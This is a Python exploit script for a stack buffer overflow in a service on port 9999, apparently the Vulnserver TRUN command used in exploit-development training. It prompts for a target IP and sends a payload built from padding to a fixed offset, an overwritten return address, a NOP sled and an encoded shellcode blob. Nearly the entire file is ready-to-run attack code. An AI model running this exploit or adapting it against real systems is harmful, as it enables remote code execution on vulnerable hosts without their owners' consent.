#!/usr/bin/python3
import socket
import struct

#The statement below is used to find out the bad characters that might break the shellcode.
#Bad characters found = NONE

#all_characters = b"".join([struct.pack('<B', x) for x in range(1, 256)]) 

print("-" * 50)
user_input = input("[+] Enter target IP ")
target_ip = user_input
port = 9999
total_length = 2984
offset = 2003
new_eip = struct.pack('<I', 0x625011AF)
nop_sled = b"\x90" * 18

buf =  b""
buf += b"\xba\x4d\x21\xb2\x83\xdd\xc4\xd9\x74\x24\xf4\x5b\x2b"
buf += b"\xc9\xb1\x59\x31\x53\x14\x83\xeb\xfc\x03\x53\x10\xaf"
buf += b"\xd4\x4e\x6b\xa0\x17\xaf\x6c\xde\x26\x7d\xe5\xfb\x2d"
buf += b"\x0a\xa4\x33\x25\x5e\x45\xb8\x6b\x4b\xde\xcc\xa3\x42"
buf += b"\x1f\x3f\x03\xee\xf9\x0e\xab\x43\x39\x11\x57\x9e\x6e"
buf += b"\xf1\x66\x51\x63\xf0\xaf\x27\x09\x1d\x7d\x33\xa3\xf1"
buf += b"\x09\x01\x78\xa6\x0c\x56\x0b\x08\x77\xd3\xcc\xfc\xcb"
buf += b"\xda\x1c\xac\x58\x84\xbc\xc7\x17\x2d\xbc\x04\x22\x84"
buf += b"\xca\x96\x64\x26\xcc\x6d\x42\xc3\x33\xa7\x9a\x13\xf2"
buf += b"\x88\xd0\x3f\xf4\xd1\xd3\xdf\x82\x29\x20\x5d\x95\xea"
buf += b"\x5a\xb9\x10\xec\xfd\x4a\x82\xc8\xfc\x9f\x55\x9b\xf3"
buf += b"\x54\x11\xc3\x17\x6a\xf6\x78\x23\xe7\xf9\xae\xa5\xb3"
buf += b"\xdd\x6a\xed\x60\x7f\x2b\x4b\xc6\x80\x2b\x33\xb7\x24"
buf += b"\x20\xd6\xae\x59\xc9\x28\xcf\x07\x5d\xe4\x02\xb8\x9d"
buf += b"\x62\x14\xcb\xaf\x2d\x8e\x43\x83\xa6\x08\x93\x92\xa1"
buf += b"\xaa\x4b\x1c\xa1\x54\x6c\x5c\xeb\x92\x38\x0c\x83\x33"
buf += b"\x41\xc7\x53\xbb\x94\x7d\x5e\x2b\xd7\x29\x28\x2b\xbf"
buf += b"\x2b\xd5\x3a\x1c\xa2\x33\x6c\xcc\xe4\xeb\xcd\xbc\x44"
buf += b"\x5c\xa6\xd6\x4b\x83\xd6\xd8\x86\xac\x7d\x37\x7e\x84"
buf += b"\xe9\xae\xdb\x5e\x8b\x2f\xf6\x1a\x8b\xa4\xf2\xdb\x42"
buf += b"\x4d\x77\xc8\xb3\x2a\x77\x10\x44\xdf\x77\x7a\x40\x49"
buf += b"\x20\x12\x4a\xac\x06\xbd\xb5\x9b\x15\xba\x4a\x5a\x2f"
buf += b"\xb0\x7d\xc8\x0f\xae\x81\x1c\x8f\x2e\xd4\x76\x8f\x46"
buf += b"\x80\x22\xdc\x73\xcf\xfe\x71\x28\x5a\x01\x23\x9c\xcd"
buf += b"\x69\xc9\xfb\x3a\x36\x32\x2e\x39\x31\xcc\xac\x16\x9a"
buf += b"\xa4\x4e\x27\x1a\x34\x25\xa7\x4a\x5c\xb2\x88\x65\xac"
buf += b"\x3b\x03\x2e\xa4\xb6\xc2\x9c\x55\xc6\xce\x41\xcb\xc7"
buf += b"\xfd\x59\xfc\xb2\x8e\x5e\xfd\x42\x87\x3a\xfe\x42\xa7"
buf += b"\x3c\xc3\x94\x9e\x4a\x02\x25\xa5\x45\x31\x08\x8c\xcf"
buf += b"\x39\x1e\xce\xc5"


shellcode = buf

s = socket.socket()
s.connect((target_ip, port))

payload = [
	b"TRUN /.:/",
	b"A" * offset,
	new_eip,
	nop_sled,
	shellcode,
	b"C" * (total_length - offset - len(new_eip) - len(nop_sled) - len(shellcode))
	
]

payload = b"".join(payload)
s.send(payload)
print("[+] Payload sent successfully ")

s.close()
